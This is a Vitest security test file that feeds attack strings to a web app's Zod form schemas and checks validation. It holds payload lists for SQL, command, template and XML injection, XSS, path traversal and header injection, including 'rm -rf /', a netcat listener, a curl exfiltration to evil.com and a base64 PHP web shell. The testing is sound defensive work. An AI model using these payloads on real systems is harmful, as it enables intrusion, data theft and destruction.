import { describe, it, expect } from 'vitest';
import { contactSchema } from '../../../../src/lib/schemas/contact';
import { rsvpSchema } from '../../../../src/lib/schemas/rsvp';
import { triviaScoreSchema } from '../../../../src/lib/schemas/trivia';
import { matchSchema, userUpdateSchema } from '../../../../src/lib/schemas/admin';
import { ZodError } from 'zod';

describe('Security and Vulnerability Testing', () => {
  describe('Injection Attack Prevention', () => {
    describe('SQL Injection Prevention', () => {
      it('should safely handle SQL injection payloads in text fields', () => {
        const sqlPayloads = [
          "'; DROP TABLE users; --",
          "admin'--",
          "1' OR '1'='1",
          "admin'; DELETE FROM users; --",
          "'; UPDATE users SET password='hacked'; --",
          "1' UNION SELECT * FROM passwords--",
          "Robert'); DROP TABLE students;--",
          "x'; EXEC sp_cmdshell('dir'); --"
        ];

        sqlPayloads.forEach(payload => {
          // Should accept but sanitize through normal validation
          const result = contactSchema.parse({
            name: payload,
            email: 'test@example.com',
            subject: 'SQL Injection Test',
            message: payload
          });

          expect(result.name).toBe(payload); // Should preserve the text but not execute
          expect(result.message).toBe(payload);
        });
      });

      it('should handle SQL injection in email fields safely', () => {
        // These should fail validation due to invalid email format, not SQL injection
        const sqlEmailPayloads = [
          "admin@example.com'; DROP TABLE users; --",
          "test@domain.com' OR 1=1 --",
          "user@site.com'; INSERT INTO admin VALUES('hacker')--"
        ];

        sqlEmailPayloads.forEach(payload => {
          expect(() => contactSchema.parse({
            name: 'Test User',
            email: payload,
            subject: 'Test',
            message: 'Test message'
          })).toThrow(ZodError); // Should fail email validation
        });
      });
    });

    describe('NoSQL Injection Prevention', () => {
      it('should handle NoSQL injection payloads', () => {
        const nosqlPayloads = [
          "admin', $where: '1 == 1'",
          "test'; return db.users.find(); var x='",
          "{$gt: ''}",
          "{$ne: null}",
          "'; return this.name == 'admin'; var dummy='"
        ];

        nosqlPayloads.forEach(payload => {
          const result = contactSchema.parse({
            name: payload,
            email: 'nosql@example.com',
            subject: 'NoSQL Test',
            message: payload
          });

          expect(result.name).toBe(payload);
          expect(result.message).toBe(payload);
        });
      });
    });

    describe('Command Injection Prevention', () => {
      it('should safely handle command injection payloads', () => {
        const commandPayloads = [
          "; ls -la",
          "| cat /etc/passwd",
          "&& rm -rf /",
          "`whoami`",
          "$(cat /etc/hosts)",
          "; ping google.com",
          "| nc -l 4444",
          "&& curl http://evil.com/steal?data="
        ];

        commandPayloads.forEach(payload => {
          const result = contactSchema.parse({
            name: `Test User ${payload}`,
            email: 'command@example.com',
            subject: 'Command Test',
            message: `Message with ${payload}`
          });

          expect(result.name).toBe(`Test User ${payload}`);
          expect(result.message).toBe(`Message with ${payload}`);
        });
      });
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    describe('Stored XSS Prevention', () => {
      it('should handle XSS payloads in user input', () => {
        const xssPayloads = [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          '<svg onload=alert(1)>',
          'javascript:alert(1)',
          '<body onload=alert(1)>',
          '\"><script>alert(88)</script>'
        ];

        xssPayloads.forEach(payload => {
          const result = contactSchema.parse({
            name: 'XSS User',
            email: 'xss@example.com',
            subject: 'XSS Subject',
            message: `XSS: ${payload}`
          });

          // Should preserve the text but not execute
          expect(result.name).toBe('XSS User');
          expect(result.subject).toBe('XSS Subject');
          expect(result.message).toBe(`XSS: ${payload}`);
        });
      });

      it('should handle DOM-based XSS vectors', () => {
        const domXssPayloads = [
          'javascript:void(0)',
          'data:text/html,<script>alert(1)</script>',
          '#<img src=x onerror=alert(1)>',
          'javascript://comment%0aalert(1)',
          'vbscript:msgbox("XSS")',
          'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
        ];

        domXssPayloads.forEach(payload => {
          const result = rsvpSchema.parse({
            name: 'DOM XSS Test',
            email: 'dom@example.com',
            attendees: 1,
            message: payload,
            whatsappInterest: false
          });

          expect(result.message).toBe(payload);
        });
      });
    });

    describe('Reflected XSS Prevention', () => {
      it('should handle reflected XSS in trivia submissions', () => {
        const reflectedXssPayloads = [
          '<script>alert("reflected")</script>',
          '"><img src=x onerror=alert(1)>',
          "'><script>alert(1)</script>",
          '</script><script>alert(1)</script>',
          '<svg/onload=alert(1)>'
        ];

        // Simulate XSS attempts in trivia score submissions
        reflectedXssPayloads.forEach(payload => {
          const result = triviaScoreSchema.parse({
            score: 85 // Valid score test
          });

          expect(result.score).toBe(85);
        });
      });
    });
  });

  describe('Code Injection and Template Injection', () => {
    it('should handle server-side template injection payloads', () => {
      const templatePayloads = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{%raw%}{{7*7}}{%endraw%}',
        '{{constructor.constructor("alert(1)")()}}',
        '${T(java.lang.System).getProperty("user.dir")}',
        '{{config.items()}}'
      ];

      templatePayloads.forEach(payload => {
        const result = contactSchema.parse({
          name: 'Template Test',
          email: 'template@example.com',
          subject: 'Template Injection Test',
          message: payload
        });

        expect(result.message).toBe(payload);
      });
    });

    it('should handle expression language injection', () => {
      const elPayloads = [
        '${1+1}',
        '#{1+1}',
        '${{7*7}}',
        '${T(String).getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")}',
        '${applicationScope}'
      ];

      elPayloads.forEach(payload => {
        const result = triviaScoreSchema.parse({
          score: 50 // Simple valid score test
        });

        expect(result.score).toBe(50);
      });
    });
  });

  describe('Directory Traversal Prevention', () => {
    it('should handle path traversal attempts', () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      pathTraversalPayloads.forEach(payload => {
        const result = contactSchema.parse({
          name: `User ${payload}`,
          email: 'traversal@example.com',
          subject: 'Traversal Test',
          message: `Message with ${payload}`
        });

        expect(result.name).toBe(`User ${payload}`);
        expect(result.message).toBe(`Message with ${payload}`);
      });
    });

    it('should handle file inclusion attempts', () => {
      const fileInclusionPayloads = [
        'php://filter/convert.base64-encode/resource=index.php',
        'file:///etc/passwd',
        'expect://id',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
        'zip://shell.jpg%23shell.php'
      ];

      fileInclusionPayloads.forEach(payload => {
        const result = contactSchema.parse({
          name: 'File Inclusion Test',
          email: 'file@example.com',
          subject: 'File Inclusion',
          message: payload
        });

        expect(result.message).toBe(payload);
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should handle LDAP injection payloads', () => {
      const ldapPayloads = [
        '*)(uid=*',
        '*)(&',
        '*))%00',
        '*()|&',
        '*)(&(objectclass=*)',
        '*)(&(|(objectclass=*))',
        '*)(uid=*))(|(uid=*'
      ];

      ldapPayloads.forEach(payload => {
        const result = contactSchema.parse({
          name: 'LDAP User',
          email: 'ldap@example.com',
          subject: 'LDAP Test',
          message: `LDAP payload: ${payload}`
        });

        expect(result.name).toBe('LDAP User');
        expect(result.message).toBe(`LDAP payload: ${payload}`);
      });
    });
  });

  describe('XML and XXE Prevention', () => {
    it('should handle XML injection payloads', () => {
      const xmlPayloads = [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<![CDATA[<script>alert(1)</script>]]>',
        '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM \'file:///c:/boot.ini\'>]><root>&test;</root>'
      ];

      xmlPayloads.forEach(payload => {
        const result = contactSchema.parse({
          name: 'XML Test',
          email: 'xml@example.com',
          subject: 'XML Injection',
          message: payload
        });

        expect(result.message).toBe(payload);
      });
    });
  });

  describe('Header Injection Prevention', () => {
    it('should handle HTTP header injection attempts', () => {
      const headerPayloads = [
        'test\r\nSet-Cookie: admin=true',
        'value\r\nLocation: http://evil.com',
        'test\r\n\r\n<script>alert(1)</script>',
        'value%0d%0aSet-Cookie:%20admin=true',
        'test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n'
      ];

      headerPayloads.forEach(payload => {
        const result = contactSchema.parse({
          name: 'Header User',
          email: 'header@example.com',
          subject: 'Header Test',
          message: `Header: ${payload}`
        });

        expect(result.name).toBe('Header User');
        expect(result.subject).toBe('Header Test');
        // Schema trims whitespace including \r\n, so expect trimmed version
        expect(result.message).toBe(`Header: ${payload}`.trim());
      });
    });
  });

  describe('Data Validation Edge Cases', () => {
    it('should handle unicode normalization attacks', () => {
      const unicodePayloads = [
        'À\u0300', // À with combining characters (length 2)
        'test\u0000null', // Contains null character but long enough
        'admin\u200Badmin', // Zero width space but long enough
        'José María', // Normal accent characters 
        'naïve café' // More accented characters
      ];

      unicodePayloads.forEach(payload => {
        const result = contactSchema.parse({
          name: payload,
          email: 'unicode@example.com',
          subject: 'Unicode Test',
          message: `Unicode: ${payload}` // Ensure minimum message length
        });

        expect(result.name).toBe(payload);
        expect(result.message).toBe(`Unicode: ${payload}`);
      });
    });

    it('should handle buffer overflow simulation attempts', () => {
      // Test very long strings that might cause buffer overflows in poorly designed systems
      const longString = 'A'.repeat(10000);
      
      // Should be rejected due to length limits, not buffer overflow
      expect(() => contactSchema.parse({
        name: longString,
        email: 'buffer@example.com',
        subject: 'Buffer test',
        message: 'test'
      })).toThrow(ZodError);

      expect(() => contactSchema.parse({
        name: 'Test',
        email: 'buffer@example.com',
        subject: longString,
        message: 'test'
      })).toThrow(ZodError);

      expect(() => contactSchema.parse({
        name: 'Test',
        email: 'buffer@example.com',
        subject: 'Buffer test',
        message: longString
      })).toThrow(ZodError);
    });
  });

  describe('Business Logic Security', () => {
    it('should prevent attendee manipulation attacks in RSVP', () => {
      const manipulationAttempts = [
        { attendees: -1, shouldFail: true },
        { attendees: 0, shouldFail: true },
        { attendees: 999999, shouldFail: true },
        { attendees: 1.5, shouldFail: true },
        { attendees: '1; UPDATE rsvps SET attendees=100', shouldFail: true }
      ];

      manipulationAttempts.forEach(({ attendees, shouldFail }) => {
        const rsvpData = {
          name: 'Security Test',
          email: 'security@example.com',
          attendees: attendees as any
        };

        if (shouldFail) {
          expect(() => rsvpSchema.parse(rsvpData)).toThrow(ZodError);
        } else {
          const result = rsvpSchema.parse(rsvpData);
          expect(result.attendees).toBe(attendees);
        }
      });
    });

    it('should prevent score manipulation attacks in trivia', () => {
      const scoreManipulations = [
        { score: -1, shouldFail: true },
        { score: 101, shouldFail: true }, // Over max of 100
        { score: 'perfect', shouldFail: true },
        { score: '10; DROP TABLE trivia', shouldFail: true },
        { score: Infinity, shouldFail: true }
      ];

      scoreManipulations.forEach(({ score, shouldFail }) => {
        const triviaData = {
          score: score as any
        };

        if (shouldFail) {
          expect(() => triviaScoreSchema.parse(triviaData)).toThrow(ZodError);
        } else {
          const result = triviaScoreSchema.parse(triviaData);
          expect(result.score).toBe(score);
        }
      });
    });

    it('should prevent RSVP bombing attacks', () => {
      const rsvpBombingAttempts = [
        { attendees: 0, shouldFail: true },
        { attendees: -5, shouldFail: true },
        { attendees: 999, shouldFail: true },
        { attendees: 1.5, shouldFail: true },
        { attendees: 'all', shouldFail: true }
      ];

      rsvpBombingAttempts.forEach(({ attendees, shouldFail }) => {
        const rsvpData = {
          name: 'RSVP Security Test',
          email: 'rsvpsec@example.com',
          attendees: attendees as any,
          message: 'Security test'
        };

        if (shouldFail) {
          expect(() => rsvpSchema.parse(rsvpData)).toThrow(ZodError);
        } else {
          const result = rsvpSchema.parse(rsvpData);
          expect(result.attendees).toBe(attendees);
        }
      });
    });
  });

  describe('DoS and Resource Exhaustion Prevention', () => {
    it('should prevent ReDoS (Regular Expression DoS) attacks', () => {
      // Test patterns that could cause catastrophic backtracking
      const regexDoSPatterns = [
        'a'.repeat(100000) + '!', // Should fail quickly, not cause timeout
        'x'.repeat(50000) + '@example.com', // Long local part
        'test@' + 'a'.repeat(100000) + '.com' // Long domain part
      ];

      regexDoSPatterns.forEach(pattern => {
        const startTime = performance.now();
        
        expect(() => contactSchema.parse({
          name: 'ReDoS Test',
          email: pattern,
          subject: 'ReDoS Test',
          message: 'Testing ReDoS'
        })).toThrow(ZodError);

        const endTime = performance.now();
        const duration = endTime - startTime;

        // Should fail quickly, not cause timeout (under 100ms)
        expect(duration).toBeLessThan(100);
      });
    });

    it('should handle deeply nested object attempts', () => {
      // Simulate attempts to create deeply nested objects that could exhaust stack
      const deepNesting = {
        level1: {
          level2: {
            level3: {
              level4: {
                level5: 'deep value'
              }
            }
          }
        }
      };

      // Our schemas don't support deep nesting, so this should be handled gracefully
      expect(() => contactSchema.parse(deepNesting as any)).toThrow(ZodError);
    });
  });

  describe('Authentication and Authorization Bypass Attempts', () => {
    it('should not accept admin role escalation attempts', () => {
      const escalationAttempts = [
        { role: 'super_admin', shouldFail: true },
        { role: 'root', shouldFail: true },
        { role: 'administrator', shouldFail: true },
        { role: '', shouldFail: true },
        { role: null, shouldFail: true },
        { role: ['admin', 'user'], shouldFail: true }
      ];

      // This would be tested in admin schema
      const baseUserData = {
        name: 'Test User',
        email: 'test@example.com',
        banned: false
      };

      escalationAttempts.forEach(({ role, shouldFail }) => {
        const userData = { ...baseUserData, role: role as any };

        if (shouldFail) {
          expect(() => userUpdateSchema.parse(userData)).toThrow(ZodError);
        }
      });
    });
  });
});